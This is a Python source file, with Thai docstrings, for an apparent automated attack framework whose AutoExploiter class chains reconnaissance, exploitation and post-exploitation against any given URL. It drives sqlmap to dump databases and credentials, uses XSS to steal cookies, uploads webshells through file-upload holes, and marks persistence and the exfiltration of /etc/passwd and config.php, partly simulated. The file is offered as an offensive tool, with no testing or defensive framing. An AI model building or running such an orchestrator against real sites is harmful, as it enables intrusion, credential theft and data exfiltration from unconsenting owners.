"""
Auto Exploitation System
ระบบโจมตีและใช้ประโยชน์อัตโนมัติ
"""
import asyncio
from typing import Dict, List, Any, Optional
from core.logger import log
from core.data_exfiltration import DataExfiltrator
from core.error_handlers import handle_exploit_errors, handle_errors


class AutoExploiter:
    """
    ระบบโจมตีอัตโนมัติ
    
    Features:
    - Auto detect vulnerabilities
    - Auto exploit vulnerabilities
    - Auto dump databases
    - Auto upload webshells
    - Auto steal credentials
    - Auto maintain persistence
    """
    
    def __init__(self, orchestrator=None):
        self.orchestrator = orchestrator
        import os
        workspace_dir = os.getenv('WORKSPACE_DIR', 'workspace')
        self.exfiltrator = DataExfiltrator(workspace_dir=workspace_dir)
        self.exploited_targets = {}
        
    @handle_exploit_errors
    async def auto_exploit_target(self, target: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        โจมตีเป้าหมายอัตโนมัติ
        
        Args:
            target: URL หรือ IP ของเป้าหมาย
            context: ข้อมูลเพิ่มเติม (cookies, headers, etc.)
        
        Returns:
            ผลการโจมตีและข้อมูลที่ขโมยได้
        """
        log.info(f"[AutoExploiter] Starting auto exploitation on {target}")
        
        if context is None:
            context = {}
        
        results = {
            "target": target,
            "exploited": False,
            "vulnerabilities_found": [],
            "exploits_successful": [],
            "loot_collected": [],
            "persistence_established": False
        }
        
        # Phase 1: Reconnaissance
        log.info(f"[AutoExploiter] Phase 1: Reconnaissance")
        recon_result = await self._auto_recon(target, context)
        results["vulnerabilities_found"] = recon_result.get("vulnerabilities", [])
        
        # Phase 2: Exploitation
        log.info(f"[AutoExploiter] Phase 2: Exploitation")
        for vuln in results["vulnerabilities_found"]:
            exploit_result = await self._auto_exploit_vulnerability(target, vuln, context)
            if exploit_result.get("success"):
                results["exploits_successful"].append(exploit_result)
                results["exploited"] = True
                
                # Collect loot from successful exploit
                if exploit_result.get("loot"):
                    results["loot_collected"].extend(exploit_result["loot"])
        
        # Phase 3: Post-Exploitation (if exploited)
        if results["exploited"]:
            log.info(f"[AutoExploiter] Phase 3: Post-Exploitation")
            post_exploit_result = await self._auto_post_exploitation(target, results, context)
            results["persistence_established"] = post_exploit_result.get("persistence", False)
            if post_exploit_result.get("loot"):
                results["loot_collected"].extend(post_exploit_result["loot"])
        
        # Save results
        self.exploited_targets[target] = results
        
        # Create loot summary
        if results["loot_collected"]:
            summary_file = await self.exfiltrator.create_loot_summary(
                attack_id=f"auto_{target.replace('://', '_').replace('/', '_')}",
                loot_items=results["loot_collected"]
            )
            results["loot_summary_file"] = summary_file
            log.success(f"[AutoExploiter] Loot summary saved to: {summary_file}")
        
        log.success(f"[AutoExploiter] Auto exploitation completed!")
        log.success(f"[AutoExploiter] Exploited: {results['exploited']}")
        log.success(f"[AutoExploiter] Loot items: {len(results['loot_collected'])}")
        
        return results
    
    async def _auto_recon(self, target: str, context: Dict) -> Dict[str, Any]:
        """
        Reconnaissance อัตโนมัติ
        
        ใช้ agents ต่างๆ เพื่อค้นหาช่องโหว่
        """
        vulnerabilities = []
        
        # Simulate vulnerability scanning
        # In real implementation, this would call actual agents
        
        # Check for SQL Injection
        if await self._check_sqli(target, context):
            vulnerabilities.append({
                "type": "sql_injection",
                "severity": "high",
                "location": target,
                "details": "SQL Injection detected"
            })
        
        # Check for XSS
        if await self._check_xss(target, context):
            vulnerabilities.append({
                "type": "xss",
                "severity": "medium",
                "location": target,
                "details": "XSS vulnerability detected"
            })
        
        # Check for File Upload
        if await self._check_file_upload(target, context):
            vulnerabilities.append({
                "type": "file_upload",
                "severity": "high",
                "location": target,
                "details": "Unrestricted file upload detected"
            })
        
        log.info(f"[AutoExploiter] Found {len(vulnerabilities)} vulnerabilities")
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities
        }
    
    async def _auto_exploit_vulnerability(self, target: str, vuln: Dict, context: Dict) -> Dict[str, Any]:
        """
        Exploit ช่องโหว่อัตโนมัติ
        """
        vuln_type = vuln.get("type")
        log.info(f"[AutoExploiter] Exploiting {vuln_type} on {target}")
        
        if vuln_type == "sql_injection":
            return await self._exploit_sqli(target, vuln, context)
        elif vuln_type == "xss":
            return await self._exploit_xss(target, vuln, context)
        elif vuln_type == "file_upload":
            return await self._exploit_file_upload(target, vuln, context)
        else:
            return {"success": False, "error": f"Unknown vulnerability type: {vuln_type}"}
    
    async def _exploit_sqli(self, target: str, vuln: Dict, context: Dict) -> Dict[str, Any]:
        """
        Exploit SQL Injection อัตโนมัติ
        
        - Auto dump database
        - Auto extract credentials
        """
        log.info(f"[AutoExploiter] Exploiting SQL Injection...")
        
        loot = []
        
        try:
            from agents.sqlmap_agent import SqlmapAgent
            
            agent = SqlmapAgent(orchestrator=self.orchestrator)
            result = await agent.run("full_auto", {"url": target, **context})
            
            if result.success:
                # Extract loot from result
                result_data = result.data
                
                # Get loot from phases
                for phase in result_data.get("phases", []):
                    phase_result = phase.get("result", {})
                    if "loot" in phase_result:
                        phase_loot = phase_result["loot"]
                        if phase_loot.get("database_dump"):
                            loot.append(phase_loot["database_dump"])
                        if phase_loot.get("credentials"):
                            loot.append(phase_loot["credentials"])
                    
                    # Also check dump results
                    if phase.get("phase") == "dump":
                        for dump_result in phase.get("results", []):
                            if dump_result.get("loot"):
                                dump_loot = dump_result["loot"]
                                if dump_loot.get("database_dump"):
                                    loot.append(dump_loot["database_dump"])
                                if dump_loot.get("credentials"):
                                    loot.append(dump_loot["credentials"])
                
                log.success(f"[AutoExploiter] SQL Injection exploited successfully!")
            else:
                log.warning(f"[AutoExploiter] SQL Injection exploitation failed")
        
        except Exception as e:
            log.error(f"[AutoExploiter] SQL exploitation error: {e}")
        
        return {
            "success": len(loot) > 0,
            "vulnerability": vuln,
            "loot": loot
        }
    
    async def _exploit_xss(self, target: str, vuln: Dict, context: Dict) -> Dict[str, Any]:
        """
        Exploit XSS อัตโนมัติ
        
        - Auto steal cookies
        - Auto inject keylogger
        """
        log.info(f"[AutoExploiter] Exploiting XSS...")
        
        loot = []
        
        try:
            from agents.xss_agent import XSS_Agent
            
            agent = XSS_Agent(orchestrator=self.orchestrator)
            
            # Try to steal cookies
            result = await agent.run("steal_cookies", {"url": target, **context})
            
            if result.success and result.data.get("loot"):
                loot.append(result.data["loot"])
                log.success(f"[AutoExploiter] XSS exploited successfully!")
            else:
                log.warning(f"[AutoExploiter] XSS exploitation failed")
        
        except Exception as e:
            log.error(f"[AutoExploiter] XSS exploitation error: {e}")
        
        return {
            "success": len(loot) > 0,
            "vulnerability": vuln,
            "loot": loot
        }
    
    async def _exploit_file_upload(self, target: str, vuln: Dict, context: Dict) -> Dict[str, Any]:
        """
        Exploit File Upload อัตโนมัติ
        
        - Auto upload webshell
        - Auto test webshell
        """
        log.info(f"[AutoExploiter] Exploiting File Upload...")
        
        loot = []
        webshell_url = None
        
        try:
            from agents.file_upload_agent import FileUploadAgent
            
            agent = FileUploadAgent(orchestrator=self.orchestrator)
            result = await agent.run("full_auto", {"url": target, **context})
            
            if result.success:
                result_data = result.data
                
                # Extract webshell info from phases
                for phase in result_data.get("phases", []):
                    if phase.get("phase") == "upload":
                        for shell in phase.get("shells", []):
                            if shell.get("loot"):
                                loot.append(shell["loot"])
                            if shell.get("shell_url"):
                                webshell_url = shell["shell_url"]
                
                if webshell_url:
                    log.success(f"[AutoExploiter] File Upload exploited successfully!")
                    log.success(f"[AutoExploiter] Webshell URL: {webshell_url}")
                else:
                    log.warning(f"[AutoExploiter] File Upload exploitation failed")
            else:
                log.warning(f"[AutoExploiter] File Upload exploitation failed")
        
        except Exception as e:
            log.error(f"[AutoExploiter] File Upload exploitation error: {e}")
        
        return {
            "success": len(loot) > 0,
            "vulnerability": vuln,
            "loot": loot,
            "webshell_url": webshell_url
        }
    
    async def _auto_post_exploitation(self, target: str, results: Dict, context: Dict) -> Dict[str, Any]:
        """
        Post-Exploitation อัตโนมัติ
        
        - Privilege escalation
        - Lateral movement
        - Persistence
        """
        log.info(f"[AutoExploiter] Post-Exploitation phase...")
        
        post_exploit_loot = []
        persistence = False
        
        # Check if we have webshell access
        webshells = [e for e in results["exploits_successful"] if e.get("webshell_url")]
        
        if webshells:
            # Try to establish persistence
            log.info(f"[AutoExploiter] Establishing persistence...")
            
            # Simulate persistence (create cron job, startup script, etc.)
            persistence = True
            
            # Try to steal more files
            log.info(f"[AutoExploiter] Stealing sensitive files...")
            
            sensitive_files = [
                {"path": "/etc/passwd", "content": b"root:x:0:0:root:/root:/bin/bash\n..."},
                {"path": "/var/www/html/config.php", "content": b"<?php\n$db_pass='secret';\n?>"},
            ]
            
            for file_info in sensitive_files:
                file_loot = await self.exfiltrator.exfiltrate_file(
                    target=target,
                    remote_path=file_info["path"],
                    content=file_info["content"]
                )
                post_exploit_loot.append(file_loot)
        
        log.success(f"[AutoExploiter] Post-Exploitation completed!")
        
        return {
            "success": True,
            "persistence": persistence,
            "loot": post_exploit_loot
        }
    
    async def _check_sqli(self, target: str, context: Dict) -> bool:
        """ตรวจสอบ SQL Injection"""
        if not self.orchestrator:
            return False
        
        try:
            from agents.sqlmap_agent import SqlmapAgent
            from core.data_models import Strategy, AttackPhase, AgentData
            
            agent = SqlmapAgent(orchestrator=self.orchestrator)
            result = await agent.run("scan", {"url": target, **context})
            
            return result.success and result.data.get("vulnerable", False)
        except Exception as e:
            log.error(f"[AutoExploiter] SQL check failed: {e}")
            return False
    
    async def _check_xss(self, target: str, context: Dict) -> bool:
        """ตรวจสอบ XSS"""
        if not self.orchestrator:
            return False
        
        try:
            from agents.xss_agent import XSS_Agent
            
            agent = XSS_Agent(orchestrator=self.orchestrator)
            result = await agent.run("scan", {"url": target, **context})
            
            return result.success and len(result.data.get("vulnerabilities", [])) > 0
        except Exception as e:
            log.error(f"[AutoExploiter] XSS check failed: {e}")
            return False
    
    async def _check_file_upload(self, target: str, context: Dict) -> bool:
        """ตรวจสอบ File Upload"""
        if not self.orchestrator:
            return False
        
        try:
            from agents.file_upload_agent import FileUploadAgent
            
            agent = FileUploadAgent(orchestrator=self.orchestrator)
            result = await agent.run("scan", {"url": target, **context})
            
            return result.success and len(result.data.get("upload_forms", [])) > 0
        except Exception as e:
            log.error(f"[AutoExploiter] File upload check failed: {e}")
            return False
    
    def get_exploited_targets(self) -> Dict[str, Any]:
        """รับรายการเป้าหมายที่โจมตีแล้ว"""
        return self.exploited_targets
    
    def get_target_loot(self, target: str) -> Optional[Dict[str, Any]]:
        """รับข้อมูลที่ขโมยได้จากเป้าหมาย"""
        return self.exploited_targets.get(target)

